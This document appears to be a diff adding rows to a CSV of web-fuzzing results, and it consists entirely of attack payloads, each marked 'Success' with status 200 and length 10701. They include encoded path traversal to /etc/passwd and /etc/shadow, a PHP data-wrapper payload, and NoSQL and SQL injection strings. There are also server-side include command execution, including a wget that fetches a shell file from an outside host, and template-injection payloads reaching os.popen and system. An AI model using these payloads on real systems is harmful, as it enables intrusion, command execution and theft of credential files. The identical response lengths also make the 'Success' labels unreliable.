+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2Fetc%2Fpasswd,200,10701
+Success,%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
+Success,%2Fetc%2Fshadow,200,10701
+Success,%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
+Success,%252E%252Findex,200,10701
+Success,%252E%252Findex%252Ephp,200,10701
+Success,%252E%252Findex%252Ephp%00,200,10701
+Success,%252E%252E%252Findex,200,10701
+Success,%252E%252E%252Findex%252Ephp,200,10701
+Success,%252E%252E%252Findex%252Ephp%00,200,10701
+Success,%252E%252E%252F%252E%252E%252Findex,200,10701
+Success,%252E%252E%252F%252E%252E%252Findex%252Ephp,200,10701
+Success,%252E%252E%252F%252E%252E%252Findex%252Ephp%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Findex,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Findex%252Ephp,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Findex%252Ephp%00,200,10701
+Success,%252Fetc%252Fpasswd,200,10701
+Success,%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
+Success,%252Fetc%252Fshadow,200,10701
+Success,%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
+Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
+Success,"data://text/plain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=",200,10701
+Success,"data%3A%2F%2Ftext%2Fplain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=",200,10701
+Success,"data%253A%252F%252Ftext%252Fplain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=true, $where: '1 == 1'",200,10701
+Success,", $where: '1 == 1'",200,10701
+Success,$where: '1 == 1',200,10701
+Success,"', $where: '1 == 1'",200,10701
+Success,"1, $where: '1 == 1'",200,10701
+Success,{ $ne: 1 },200,10701
+Success,"', $or: [ {}, { 'a':'a",200,10701
+Success,"' } ], $comment:'successful MongoDB injection'",200,10701
+Success,db.injection.insert({success:1});,200,10701
+Success,|| 1==1,200,10701
+Success,' && this.password.match(/.*/)//+%00,200,10701
+Success,' && this.passwordzz.match(/.*/)//+%00,200,10701
+Success,'%20%26%26%20this.password.match(/.*/)//+%00,200,10701
+Success,'%20%26%26%20this.passwordzz.match(/.*/)//+%00,200,10701
+Success,{$gt: ''},200,10701
+Success,[$ne]=1,200,10701
+Success,';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,200,10701
+Success,%20or%201=1,200,10701
+Success,; execute immediate 'sel' || 'ect us' || 'er',200,10701
+Success,declare @q nvarchar (200) 0x730065006c00650063 ...,200,10701
+Success, or 0=0 #,200,10701
+Success,inser,200,10701
+Success,; exec xp_regread,200,10701
+Success,@var select @var as var into temp end --,200,10701
+Success,# from wapiti,200,10701
+Success, or 0=0 --,200,10701
+Success, or 'a'='a,200,10701
+Success,or a = a,200,10701
+Success, UNION ALL SELECT,200,10701
+Success, or 1=1,200,10701
+Success, or 2 > 1,200,10701
+Success,PRINT,200,10701
+Success, or 3=3,200,10701
+Success,or%201=1,200,10701
+Success,or 1=1,200,10701
+Success, or '7659'='7659,200,10701
+Success, or 'text' = n'text',200,10701
+Success, or 1=1 or ''=',200,10701
+Success,declare @s varchar (200) select @s = 0x73656c6 ...,200,10701
+Success,exec xp,200,10701
+Success,3.10E+17,200,10701
+Success,admin' or ',200,10701
+Success, or 'unusual' = 'unusual',200,10701
+Success,truncate,200,10701
+Success,declare @s varchar(200) select @s = 0x77616974 ...,200,10701
+Success,or%201=1 --,200,10701
+Success,or a=a,200,10701
+Success,(sqlvuln),200,10701
+Success, or 1=1--,200,10701
+Success,0x770061006900740066006F0072002000640065006C00 ...,200,10701
+Success,%20'sleep%2050',200,10701
+Success,/**/or/**/1/**/=/**/1,200,10701
+Success,(sqlattempt2),200,10701
+Success, or (EXISTS),200,10701
+Success,%20$(sleep%2050),200,10701
+Success,%20or%20''=',200,10701
+Success,; begin declare @var varchar(8000) set @var=' ...,200,10701
+Success,0x77616974666F722064656C61792027303A303A313027 ...,200,10701
+Success,exec(@s),200,10701
+Success, union select,200,10701
+Success,declare @s varchar(22) select @s =,200,10701
+Success, or 2 between 1 and 3,200,10701
+Success, or a=a--,200,10701
+Success, or '1'='1,200,10701
+Success, or 1 --',200,10701
+Success,"or 0=0 #""",200,10701
+Success,declare @s varchar (8000) select @s = 0x73656c ...,200,10701
+Success,char%4039%41%2b%40SELECT,200,10701
+Success, or username like char(37);,200,10701
+Success, or 'text' > 't',200,10701
+Success, (select top 1,200,10701
+Success, or ''=',200,10701
+Success,%20or%20x=x,200,10701
+Success,0x730065006c0065006300740020004000400076006500 ...,200,10701
+Success,%20or%20'x'='x,200,10701
+Success, or 'something' = 'some'+'thing',200,10701
+Success,) or (a=a,200,10701
+Success,uni/**/on sel/**/ect,200,10701
+Success,&apos;%20OR,200,10701
+Success,declare @q nvarchar (200) select @q = 0x770061 ...,200,10701
+Success,; exec ('sel' + 'ect us' + 'er'),200,10701
+Success,declare @q nvarchar (4000) select @q =,200,10701
+Success,or 0=0 --,200,10701
+Success,or 0=0 #,200,10701
+Success, select name from syscolumns where id = (sele ...,200,10701
+Success,hi or a=a,200,10701
+Success,password:*/=1--,200,10701
+Success, UNION SELECT,200,10701
+Success, or 1=1 /*,200,10701
+Success,"or 1=1 or """"=",200,10701
+Success,sqlvuln;,200,10701
+Success,28%,200,10701
+Success,@variable,200,10701
+Success, or '1'='1'--,200,10701
+Success, or 1/*,200,10701
+Success, or a = a,200,10701
+Success,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),200,10701
+Success,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,200,10701
+Success,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),200,10701
+Success,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),200,10701
+Success," or 0=0 #""",200,10701
+Success,or 1=1--,200,10701
+Success," or 1=1 or """"=",200,10701
+Success, or a=a,200,10701
+Success,' or (EXISTS),200,10701
+Success,' (select top 1,200,10701
+Success,"<>""'%;)(&+",200,10701
+Success,'sqlattempt1,200,10701
+Success,'=',200,10701
+Success,or 1=1#,200,10701
+Success,/*!UNION*/,200,10701
+Success,/*!SELECT*/,200,10701
+Success,union%a0select,200,10701
+Success,/*!50000UNION*/,200,10701
+Success,/*!50000SELECT*/,200,10701
+Success,from Information_schema.tables+where+table_schema=database()--+-,200,10701
+Success,+from+Information_schema/**/.tables+where+table_schema=database()--+-,200,10701
+Success,"<pre><!--#echo var=""DATE_LOCAL"" --> </pre>",200,10701
+Success,"<pre><!--#exec cmd=""whoami""--></pre>",200,10701
+Success,"<pre><!--#exec cmd=""dir"" --></pre>",200,10701
+Success,"<!--#exec cmd=""ls"" -->",200,10701
+Success,"<!--#exec cmd=""wget http://website.com/dir/shell.txt"" -->",200,10701
+Success,"<!--#exec cmd=""/bin/ls /"" -->",200,10701
+Success,"<!--#exec cmd=""dir"" -->",200,10701
+Success,"<!--#exec cmd=""cd C:\WINDOWS\System32"">",200,10701
+Success,"<!--#config errmsg=""File not found, informs users and password""-->",200,10701
+Success,"<!--#echo var=""DOCUMENT_NAME"" -->",200,10701
+Success,"<!--#echo var=""DOCUMENT_URI"" -->",200,10701
+Success,"<!--#fsize file=""ssi.shtml"" -->",200,10701
+Success,<!--#include file=?UUUUUUUU...UU?-->,200,10701
+Success,"<!--#echo var=""DATE_LOCAL"" --> ",200,10701
+Success,"<!--#exec cmd=""whoami""--> ",200,10701
+Success,<!--#printenv -->,200,10701
+Success,"<!--#flastmod virtual=""echo.html"" -->",200,10701
+Success,"<!--#echo var=""auth_type"" -->",200,10701
+Success,"<!--#echo var=""http_referer"" -->",200,10701
+Success,"<!--#echo var=""content_length"" -->",200,10701
+Success,"<!--#echo var=""content_type"" -->",200,10701
+Success,"<!--#echo var=""http_accept_encoding"" -->",200,10701
+Success,"<!--#echo var=""forwarded"" -->",200,10701
+Success,"<!--#echo var=""document_uri"" -->",200,10701
+Success,"<!--#echo var=""date_gmt"" -->",200,10701
+Success,"<!--#echo var=""date_local"" -->",200,10701
+Success,"<!--#echo var=""document_name"" -->",200,10701
+Success,"<!--#echo var=""document_root"" -->",200,10701
+Success,"<!--#echo var=""from"" -->",200,10701
+Success,"<!--#echo var=""gateway_interface"" -->",200,10701
+Success,"<!--#echo var=""http_accept"" -->",200,10701
+Success,"<!--#echo var=""http_accept_charset"" -->",200,10701
+Success,"<!--#echo var=""http_accept_language"" -->",200,10701
+Success,"<!--#echo var=""http_connection"" -->",200,10701
+Success,"<!--#echo var=""http_cookie"" -->",200,10701
+Success,"<!--#echo var=""http_form"" -->",200,10701
+Success,"<!--#echo var=""http_host"" -->",200,10701
+Success,"<!--#echo var=""user_name"" -->",200,10701
+Success,"<!--#echo var=""unique_id"" -->",200,10701
+Success,"<!--#echo var=""tz"" -->",200,10701
+Success,"<!--#echo var=""total_hits"" -->",200,10701
+Success,"<!--#echo var=""server_software"" -->",200,10701
+Success,"<!--#echo var=""server_protocol"" -->",200,10701
+Success,"<!--#echo var=""server_port"" -->",200,10701
+Success,"<!--#echo var=""server_name -->",200,10701
+Success,"<!--#echo var=""server_addr"" -->",200,10701
+Success,"<!--#echo var=""server_admin"" -->",200,10701
+Success,"<!--#echo var=""script_url"" -->",200,10701
+Success,"<!--#echo var=""script_uri"" -->",200,10701
+Success,"<!--#echo var=""script_name"" -->",200,10701
+Success,"<!--#echo var=""script_filename"" -->",200,10701
+Success,"<!--#echo var=""netsite_root"" -->",200,10701
+Success,"<!--#echo var=""site_htmlroot"" -->",200,10701
+Success,"<!--#echo var=""path_translated"" -->",200,10701
+Success,"<!--#echo var=""path_info_translated"" -->",200,10701
+Success,"<!--#echo var=""request_uri"" -->",200,10701
+Success,"<!--#echo var=""request_method"" -->	",200,10701
+Success,"<!--#echo var=""remote_user"" -->",200,10701
+Success,"<!--#echo var=""remote_addr"" -->",200,10701
+Success,"<!--#echo var=""http_client_ip"" -->",200,10701
+Success,"<!--#echo var=""remote_port"" -->",200,10701
+Success,"<!--#echo var=""remote_ident"" -->",200,10701
+Success,"<!--#echo var=""remote_host"" -->",200,10701
+Success,"<!--#echo var=""query_string_unescaped"" -->",200,10701
+Success,"<!--#echo var=""query_string"" -->",200,10701
+Success,"<!--#echo var=""path_translated"" -->",200,10701
+Success,"<!--#echo var=""path_info"" -->",200,10701
+Success,"<!--#echo var=""path"" -->",200,10701
+Success,"<!--#echo var=""page_count"" -->",200,10701
+Success,"<!--#echo var=""last_modified"" -->",200,10701
+Success,"<!--#echo var=""http_user_agent"" -->",200,10701
+Success,"<!--#echo var=""http_ua_os"" -->",200,10701
+Success,"<!--#echo var=""http_ua_cpu"" -->",200,10701
+Success,1{{4*4}}[[5*5]],200,10701
+Success,{{7*7}},200,10701
+Success,{{7*'7'}},200,10701
+Success,<%= 7 * 7 %>,200,10701
+Success,${3*3},200,10701
+Success,${{7*7}},200,10701
+Success,@(1+2),200,10701
+Success,@(7*7),200,10701
+Success,#{3*3},200,10701
+Success,#{ 7 * 7 },200,10701
+Success,{{dump(app)}},200,10701
+Success,"{{app.request.server.all|join(',')}}",200,10701
+Success,{{config.items()}},200,10701
+Success,{{ [].class.base.subclasses() }},200,10701
+Success,{{''.class.mro()[1].subclasses()}},200,10701
+Success,{{ ''.__class__.__mro__[2].__subclasses__() }},200,10701
+Success,"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",200,10701
+Success,{{ request }},200,10701
+Success,{{self}},200,10701
+Success,<%= File.open('/etc/passwd').read %>,200,10701
+Success,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",200,10701
+Success,[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},200,10701
+Success,"${""freemarker.template.utility.Execute""?new()(""id"")}",200,10701
+Success,"{{app.request.query.filter(0,0,1024,{'options':'system'})}}",200,10701
+Success,{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},200,10701
+Success,"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read() }}",200,10701
+Success,"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",200,10701
+Success,{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},200,10701
+Success,"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",200,10701
+Success,{$smarty.version},200,10701
+Success,{php}echo `id`;{/php},200,10701
+Success,{{['id']|filter('system')}},200,10701
+Success,{{['cat\x20/etc/passwd']|filter('system')}},200,10701
+Success,{{['cat$IFS/etc/passwd']|filter('system')}},200,10701
+Success,"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",200,10701
+Success,"{{request|attr([""_""*2,""class"",""_""*2]|join)}}",200,10701
+Success,"{{request|attr([""__"",""class"",""__""]|join)}}",200,10701
